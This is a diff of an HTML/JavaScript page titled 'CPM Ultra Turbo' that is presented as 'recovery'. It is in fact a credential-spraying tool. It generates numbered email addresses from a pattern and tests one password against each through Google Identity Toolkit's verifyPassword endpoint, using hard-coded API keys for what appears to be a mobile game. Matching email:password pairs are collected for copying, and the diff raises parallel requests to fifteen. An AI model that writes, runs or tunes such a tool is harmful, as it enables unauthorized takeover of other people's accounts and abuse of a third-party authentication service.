@@ -1,95 +1,91 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPM Turbo Recovery</title>
+    <title>CPM Ultra Turbo</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body { background: #080808; color: #fff; font-family: sans-serif; text-align: center; padding: 15px; }
-        .box { max-width: 550px; margin: auto; background: #111; padding: 20px; border-radius: 12px; border: 1px solid #ff0055; box-shadow: 0 0 15px rgba(255,0,85,0.2); }
-        h2 { color: #ff0055; text-transform: uppercase; letter-spacing: 2px; }
+        .box { max-width: 550px; margin: auto; background: #111; padding: 20px; border-radius: 12px; border: 1px solid #00ffcc; box-shadow: 0 0 15px rgba(0,255,204,0.3); }
+        h2 { color: #00ffcc; text-transform: uppercase; letter-spacing: 2px; }
         input { width: 100%; padding: 12px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 5px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #ff0055; }
-        button { width: 100%; padding: 15px; background: #ff0055; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        input:focus { border-color: #00ffcc; }
+        button { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
         .stats { display: flex; justify-content: space-around; margin: 15px 0; font-size: 14px; color: #aaa; }
-        .res-area { margin-top: 20px; text-align: left; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #222; }
-        #log { height: 120px; overflow-y: auto; font-family: monospace; font-size: 11px; margin-bottom: 10px; border-bottom: 1px solid #333; color: #888; }
-        #foundList { height: 150px; width: 100%; background: #000; color: #00ff00; border: 1px solid #00ff00; border-radius: 5px; padding: 8px; font-size: 12px; font-family: monospace; }
-        .copy-btn { background: #00ff00; color: #000; padding: 8px 15px; font-size: 13px; font-weight: bold; margin-top: 10px; cursor: pointer; border-radius: 5px; display: inline-block; }
+        #foundList { height: 180px; width: 100%; background: #000; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 5px; padding: 8px; font-size: 12px; font-family: monospace; }
+        .log-mini { font-size: 10px; color: #666; height: 20px; overflow: hidden; margin-top: 5px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>🔍 TURBO RECOVERY</h2>
+    <h2>⚡ ULTRA RECOVERY</h2>
     <input type="text" id="fmt" placeholder="Format: cpmegy_{4}_@gmail.com">
-    <input type="text" id="pwd" placeholder="Password to check">
+    <input type="text" id="pwd" placeholder="Password to scan">
     
     <select id="ver" style="width:100%; padding:12px; background:#1a1a1a; color:white; border-radius:5px; border:1px solid #333;">
         <option value="AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ">CPM 2 (Fastest)</option>
         <option value="AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA">CPM 1</option>
     </select>
 
-    <button id="startBtn" onclick="startRecovery()">⚡ START SCANNING</button>
+    <button id="startBtn" onclick="startUltra()">🚀 START ULTRA SCAN</button>
 
     <div class="stats">
         <span>Checked: <b id="count">0</b></span>
-        <span>Found: <b id="foundCount" style="color:#00ff00">0</b></span>
+        <span>Found: <b id="foundCount" style="color:#00ffcc">0</b></span>
     </div>
 
-    <div class="res-area">
-        <div id="log">Logs...</div>
-        <p style="font-size: 12px; color: #00ff00; margin: 5px 0;">💎 FOUND ACCOUNTS (Email:Pass):</p>
-        <textarea id="foundList" readonly placeholder="Found accounts will appear here..."></textarea>
-        <center><div class="copy-btn" onclick="copyFound()">📋 COPY FOUND LIST</div></center>
-    </div>
+    <div class="log-mini" id="log">Status: Ready</div>
+    <textarea id="foundList" readonly placeholder="Found Email:Pass list..."></textarea>
+    <button onclick="copyFound()" style="background:#333; color:#00ffcc; padding:10px; font-size:12px; margin-top:10px;">📋 COPY ALL</button>
 </div>
 
 <script>
     let scanning = false;
+    let found = 0;
+    let checked = 0;
 
-    async function startRecovery() {
+    async function startUltra() {
         if (scanning) { location.reload(); return; }
         
         let fmt = document.getElementById('fmt').value.trim();
         let pwd = document.getElementById('pwd').value.trim();
         let key = document.getElementById('ver').value;
-        let log = document.getElementById('log');
-        let countShow = document.getElementById('count');
-        let foundShow = document.getElementById('foundCount');
-        let foundList = document.getElementById('foundList');
 
-        if (!fmt.includes('{') || !pwd) { alert("Format (with {4}) and Password are required!"); return; }
+        if (!fmt.includes('{') || !pwd) { alert("Format & Pass required!"); return; }
 
         scanning = true;
-        document.getElementById('startBtn').innerText = "🛑 STOP / RELOAD";
-        log.innerHTML = "🚀 Scanning started...<br>";
+        document.getElementById('startBtn').innerText = "🛑 STOP SCAN";
+        document.getElementById('startBtn').style.background = "#ff3333";
 
         let digitMatch = fmt.match(/\{(\d+)\}/);
         let digitCount = digitMatch ? parseInt(digitMatch[1]) : 4;
         let max = Math.pow(10, digitCount);
-        let found = 0;
 
-        // Turbo Speed Concurrency (ഒരേസമയം 5 റിക്വസ്റ്റ് വീതം)
-        for (let i = 0; i < max; i++) {
-            if (!scanning) break;
+        // --- TURBO CONCURRENCY LOGIC ---
+        // ഒരേസമയം 15 അക്കൗണ്ടുകൾ വീതം പ്രോസസ്സ് ചെയ്യും
+        let threadLimit = 15; 
+        let current = 0;
 
-            let num = i.toString().padStart(digitCount, '0');
-            let email = fmt.replace(/\{(\d+)\}/, num);
-            
-            checkAcc(email, pwd, key, log, foundList, (isFound) => {
-                if (isFound) {
-                    found++;
-                    foundShow.innerText = found;
-                }
-                countShow.innerText = i + 1;
-            });
+        async function runner() {
+            while (scanning && current < max) {
+                let i = current++;
+                let num = i.toString().padStart(digitCount, '0');
+                let email = fmt.replace(/\{(\d+)\}/, num);
+                
+                await checkAcc(email, pwd, key);
+                checked++;
+                document.getElementById('count').innerText = checked;
+                if (checked % 10 === 0) document.getElementById('log').innerText = "Checking: " + email;
+            }
+        }
 
-            // സ്പീഡ് ക്രമീകരിക്കാൻ (വളരെ കുറഞ്ഞ ഡിലേ)
-            if (i % 5 === 0) await new Promise(r => setTimeout(r, 50));
+        // ഒന്നിലധികം റണ്ണറുകൾ ഒരേസമയം സ്റ്റാർട്ട് ചെയ്യുന്നു
+        for (let t = 0; t < threadLimit; t++) {
+            runner();
         }
     }
 
-    async function checkAcc(email, pwd, key, log, foundList, callback) {
+    async function checkAcc(email, pwd, key) {
         try {
             let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                 method: 'POST',
@@ -99,27 +95,21 @@
             let data = await res.json();
 
             if (data.idToken) {
-                log.innerHTML += `<span style="color:#00ff00">💎 FOUND: ${email}</span><br>`;
-                foundList.value += email + ":" + pwd + "\n";
-                callback(true);
-            } else {
-                // ലോഗ് ക്ലീൻ ആയി വെക്കാൻ തെറ്റുന്നത് മാത്രം കാണിക്കുന്നില്ല
-                if (parseInt(document.getElementById('count').innerText) % 100 === 0) {
-                    log.innerHTML += `Checking... ${email}<br>`;
-                }
-                callback(false);
+                found++;
+                document.getElementById('foundCount').innerText = found;
+                document.getElementById('foundList').value += email + ":" + pwd + "\n";
+                document.getElementById('foundList').scrollTop = document.getElementById('foundList').scrollHeight;
             }
-        } catch (err) { callback(false); }
-        log.scrollTop = log.scrollHeight;
-        foundList.scrollTop = foundList.scrollHeight;
+        } catch (err) {
+            // Error വന്നാൽ അത് മൈൻഡ് ചെയ്യാതെ അടുത്തതിലേക്ക് പോകും
+        }
     }
 
     function copyFound() {
-        let copyText = document.getElementById("foundList");
-        if (!copyText.value) return;
-        copyText.select();
+        let t = document.getElementById("foundList");
+        t.select();
         document.execCommand("copy");
-        alert("Found accounts copied!");
+        alert("Found list copied!");
     }
 </script>
 
